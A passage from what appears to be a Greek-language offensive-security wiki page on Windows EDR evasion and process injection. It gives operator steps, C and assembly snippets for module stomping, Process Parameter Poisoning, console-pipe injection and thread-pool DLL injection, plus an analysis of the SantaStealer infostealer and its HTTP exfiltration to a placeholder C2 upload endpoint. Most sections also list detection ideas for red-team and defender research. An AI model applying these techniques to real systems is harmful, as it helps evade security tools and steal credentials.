4. Ανέλυσε τον **Export Address Table (EAT)** και επίλεξε το RVA μιας exported function ως αρχικό offset για το stomp.
5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά τα όρια της επιλεγμένης function, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Τυπικά βοηθητικά εργαλεία recon/επιλογής που συναντώνται στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Λειτουργικές σημειώσεις
- Προτιμήστε DLL που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, ώστε να αποφύγετε την τηλεμετρία των `LoadLibrary`/μη αναμενόμενων φορτώσεων image.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, οι κανονικές διαδρομές κώδικα ενδέχεται να φτάσουν στα αλλοιωμένα bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή της ενσωμάτωσης του shellcode από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον κώδικα του injector.

Ιδέες για εντοπισμό
- Εγγραφές από απόσταση σε εκτελέσιμες σελίδες που υποστηρίζονται από image (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές εκχωρήσεις RWX/RX.
- Entry points των exports των οποίων τα bytes στη μνήμη δεν ταιριάζουν πλέον με το αντίστοιχο αρχείο στο δίσκο.
- Remote threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε export νόμιμου DLL του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε μια διεργασία-στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη θυγατρική διεργασία** και τις αποθηκεύουν στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers που μπορούν να δηλητηριαστούν και αντιγράφονται από το `CreateProcessW`

Χρήσιμα carriers:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για το `CreateProcessW` και έχει όριο **32,767 χαρακτήρων Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα Unicode environment block με διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση με το `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερή τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας γίνεται ο **primitive μεταφοράς payload**. Ο operator δημιουργεί τη θυγατρική διεργασία με δεδομένα εκκίνησης που ελέγχει ο attacker και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς remote write APIs

Μετά τη δημιουργία της θυγατρικής, εντοπίστε το αντιγραμμένο buffer χρησιμοποιώντας primitives **μόνο για ανάγνωση**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργήστε κανονικά τη διεργασία (όχι σε αναστολή)
2. Κάντε εκτελέσιμη την επιλεγμένη σελίδα παραμέτρων με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας hijacking thread, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας στο handle του κύριου thread που έχει επιστραφεί.

Αυτό παρακάμπτει αρκετά API που παρακολουθούνται συχνά για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός του null byte και staged shellcode

Και οι τρεις carriers είναι **string ή δεδομένα τύπου string**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free πρώτο στάδιο**, το οποίο ανασυνθέτει σταθερές κατά την εκτέλεση και στη συνέχεια φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This επιτρέπει στο first stage να δημιουργεί strings για τη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API με βάση τη στοίβα από το first stage

Όταν το first stage πρέπει να καλέσει APIs όπως το `LoadLibraryA`, μπορεί να:

- τοποθετήσει το string/buffer στη στοίβα του στόχου
- δεσμεύσει το **32-byte x64 shadow space**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 bytes** πριν από την κλήση

Στη συνέχεια, ένα second stage μπορεί να αντιγραφεί από τη στοίβα σε μια εκχώρηση `PAGE_READWRITE`, η οποία αλλάζει σε `PAGE_EXECUTE_READ` με το `VirtualProtect`, και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση εκχώρηση RWX.

### Ιδέες για ανίχνευση

Καλές ευκαιρίες για threat hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **εκτελέσιμες τις σελίδες παραμέτρων διεργασίας**
- αλλαγή προστασίας που ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις των `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας για τα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του πλήρης primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων εκτέλεσης και μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά καταλήγει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Injection μέσω pipe στο STDIN της κονσόλας

Μια διαδραστική διεργασία-παιδί κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο του παιδιού σε ένα pipe και στέλνει έναν marker ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στη δική του ιδιωτική μνήμη, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα thread του παιδιού προς αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά εξακολουθεί να πρόκειται για process injection και όχι για γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **anonymous pipe**. Τα Windows υλοποιούν εσωτερικά τα anonymous pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles που κληρονομούνται, με προεπιλεγμένο security descriptor, τοποθετεί το handle ανάγνωσης στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί ένα νέο παιδί με ενεργοποιημένη την κληρονομικότητα handles. Επομένως, αυτό το PoC εκκινεί το παρεχόμενο εκτελέσιμο αρχείο κονσόλας· δεν συνδέει το pipe του σε υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη αλυσίδα:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη anonymous pipe για τα `STDIN` και `STDOUT` του παιδιού. Απενεργοποιεί την κληρονομικότητα στα δύο handles της πλευράς του γονέα και κλείνει τα αντίγραφα της πλευράς του παιδιού στον γονέα μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Το παιδί κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον δυαδικό πίνακα `rawData` με `WriteFile` μέσω του handle `STDIN` στην πλευρά του γονέα. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και διατηρεί ένα αντίγραφό τους σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διατρέχει τον χώρο διευθύνσεων του παιδιού με `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με `ReadProcessMemory` και αναζητά τον marker στην αρχή του `rawData`.
5. Αλλάζει το buffer που εντοπίστηκε σε `PAGE_EXECUTE_READWRITE` με το `VirtualProtectEx`.
6. Εντοπίζει το κύριο thread, το αναστέλλει, ορίζει το `RIP` σε `found_address + 0x19` με το `NtSetContextThread` και το συνεχίζει.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` ξεκινά με έναν δείκτη 25 byte, επομένως τα εκτελέσιμα bytes αρχίζουν στη δεκαεξαδική θέση `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε από κοινού τον δείκτη, το διάνυσμα αναζήτησης, το μέγεθος του πίνακα και τη θέση εκτέλεσης. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως μη επιτρεπτούς χαρακτήρες. Αυτή η ροή εργασίας δεν αλλάζει το token ή τα δικαιώματα του child process.<sup>[[41]](#references)</sup>

Για μικρά native βοηθητικά προγράμματα και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Έγχυση DLL με callback thread-pool χωρίς shellcode (DLLParty)

Το DLLParty προσαρμόζει την έγχυση thread-pool τύπου PoolParty, ώστε ένας υπάρχων worker του target να καλεί το `LoadLibraryA`, αντί να εκτελεί ένα injected callback stub. Ο μηχανισμός dispatch είναι ένα `TP_DIRECT` που τοποθετείται στην ουρά του I/O completion port του pool του target. Αυτό δεν παρακάμπτει τα δικαιώματα διεργασίας: το PoC καλεί `OpenProcess(PROCESS_ALL_ACCESS)` και χρειάζεται μνήμη του target με δικαιώματα ανάγνωσης/εγγραφής, καθώς και handles worker-factory και completion-port που μπορούν να αντιγραφούν.<sup>[[46]](#references)[[47]](#references)</sup>

Στα Windows x64, ο worker περνά έναν δείκτη προς το `TP_CALLBACK_INSTANCE` που βρίσκεται στη στοίβα του, στο `RCX`, το πρώτο όρισμα του callback. Το `LoadLibraryA` ερμηνεύει τον ίδιο δείκτη ως `LPCSTR`. Στη δοκιμασμένη διαδρομή, το `TppWorkerThread` δημιουργεί τον δείκτη στη θέση `RSP+0x178`, ενώ η πρώτη συνηθισμένη εγγραφή του σε αυτό το αντικείμενο γίνεται στη θέση `RSP+0x1d0`. Επομένως, μια null-terminated διαδρομή DLL που χωρά στο αρχικό πρόθεμα των 0x58 byte μπορεί να τοποθετηθεί στην αρχή του instance χωρίς να αντικατασταθεί πριν από το dispatch. Αυτή είναι παρατήρηση ειδική για τη συγκεκριμένη έκδοση και όχι τεκμηριωμένη εγγύηση του Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Η ροή εργασίας αναφοράς είναι η εξής:<sup>[[46]](#references)[[47]](#references)</sup>

1. Απαριθμήστε τα handles του target με το `NtQuerySystemInformation(SystemHandleInformation)` και εντοπίστε το `TpWorkerFactory` ελέγχοντας τους τύπους αντικειμένων. Αντιγράψτε ένα handle worker-factory και ζητήστε το `WorkerFactoryBasicInformation`· το `StartParameter` δίνει το απομακρυσμένο `TP_POOL`. Παραλείψτε τα factories με `TotalWorkerCount == 0`.
2. Διαβάστε το `TP_POOL.CompletionPort` και διατρέξτε την ιδιωτική λίστα workers του pool. Στη δοκιμασμένη έκδοση Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), η κεφαλή της βρίσκεται στη θέση `pool+0x60`· κάθε link βρίσκεται στη θέση `worker+0x10`, επομένως η θέση callback-instance στο `worker+0x38` ισούται με `link+0x28`. Το PoC ελέγχει τη στοίχιση των δεικτών, την αμοιβαιότητα των links, την ιδιοκτησία του pool, τα μη μηδενικά thread IDs, τους επαναλαμβανόμενους κόμβους και τη σταθερότητα της κεφαλής της λίστας.
3. Γράψτε τη διαδρομή DLL σε **κάθε** ανακτημένη θέση worker, επειδή οποιοσδήποτε worker μπορεί να καταναλώσει το completion που τοποθετήθηκε στην ουρά. Τοποθετήστε ένα `TP_DIRECT` σε εγγράψιμη μνήμη του target, με `Callback = LoadLibraryA`. Το PoC χρησιμοποιεί τη θέση `last_slot-0x500` σε στοίβα worker αντί για `VirtualAllocEx`· αυτή η μετατόπιση είναι πειραματική και δεν πρέπει να συγκρούεται με ενεργά δεδομένα της στοίβας.
4. Αντιγράψτε το handle του completion port του target και καλέστε `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Η διεύθυνση του απομακρυσμένου `TP_DIRECT` είναι το completion key. Ένας υπάρχων worker καλεί στη συνέχεια το `LoadLibraryA` με τον αντικατεστημένο δείκτη callback-instance και φορτώνει μια DLL στην οποία έχει ήδη πρόσβαση το target.

Το PoC δέχεται ένα PID target (`DLLParty.exe <target_pid>`) και χρησιμοποιεί μια hard-coded διαδρομή DLL στο `DLLParty.cpp`· ορίστε μια διαδρομή προσβάσιμη στο target πριν από τη δημιουργία ενός x64 executable. Χρησιμοποιεί επίσης τη διεύθυνση `LoadLibraryA` της δικής του διεργασίας ως απομακρυσμένο callback, επομένως υποθέτει ότι αυτή η διεύθυνση ισχύει και στο target. Ο κώδικας δεν ελέγχει αν το μήκος της διαδρομής χωρά στο πρόθεμα των 0x58 byte ούτε αν η διάσχιση των workers βρήκε κάποια θέση πριν προσπελάσει το τελευταίο στοιχείο. Επαληθεύστε ξανά τις ιδιωτικές μετατοπίσεις, τη διάταξη της στοίβας και τον εγγράψιμο χώρο για την έκδοση-στόχο. Η παράλειψη των `CreateRemoteThreadEx`, shellcode και `VirtualAllocEx` δεν εξαλείφει τις εγγραφές μεταξύ διεργασιών ή τα telemetry φόρτωσης DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Τακτικές του SantaStealer για Fileless Evasion και Κλοπή Διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν το AV bypass, την anti-analysis και την πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία ρυθμίσεων (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν βρεθεί κυριλλική διάταξη, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα ενεργοποιηθεί ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, ενώ αφήνει ένα artefact για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Διαστρωματωμένη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει ένα custom rolling checksum για κάθε όνομα και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει τον υπολογισμό checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας, όπως το `C:\analysis`.
- Η παραλλαγή B εξετάζει ιδιότητες συστήματος (ελάχιστο πλήθος διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να εντοπίσει τα VirtualBox additions και εκτελεί ελέγχους χρονισμού γύρω από τις αναμονές, ώστε να εντοπίσει single-stepping. Αν εντοπιστεί οτιδήποτε, η εκτέλεση διακόπτεται πριν από την εκκίνηση των modules.

### Fileless helper + διπλή reflective φόρτωση ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε αποθηκεύεται στον δίσκο είτε γίνεται manual mapping στη μνήμη· στη fileless λειτουργία, επιλύει μόνο του τα imports/relocations, ώστε να μην εγγράφονται helper artifacts.
- Αυτό το helper αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά των 32 byte + nonces των 12 byte). Μετά και τις δύο αποκρυπτογραφήσεις, φορτώνει το blob με reflective loading (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, που προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν inject σε ενεργό Chromium browser, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τις ενισχύσεις ασφαλείας του ABE.

### Modular συλλογή στη μνήμη και εξαγωγή μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread ανά ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, έγγραφα, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει τον αριθμό αρχείων του μετά από περίοδο αναμονής ~45s.
- Όταν ολοκληρωθεί η διαδικασία, τα πάντα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Έπειτα, το `ThreadPayload1` περιμένει 15s και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, προσποιούμενο ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε τμήμα προσθέτει τα `User-Agent: upload`, `auth: <build_id>`, προαιρετικά το `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασύνθεση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής εντοπισμού: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στην ασυλία του malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call-stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό περίβλημα του Windows Defender με την τεχνική ανακατεύθυνσης φακέλου](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την καθαρή βιτρίνα: Από RAT σε builder και coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Το SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση του malware Node.js με API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Μετατροπή του remediation driver του Defender σε primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία συναρτήσεων αυτοαπόκρυψης με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Πηγαίος κώδικας InjectSetConsole του TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Ανακατασκευή εργαλείων C# με WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Μεταγλώττιση έργων C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept και πηγαίος κώδικας του DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Κατάχρηση εσωτερικών του thread pool για DLL injection χωρίς shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
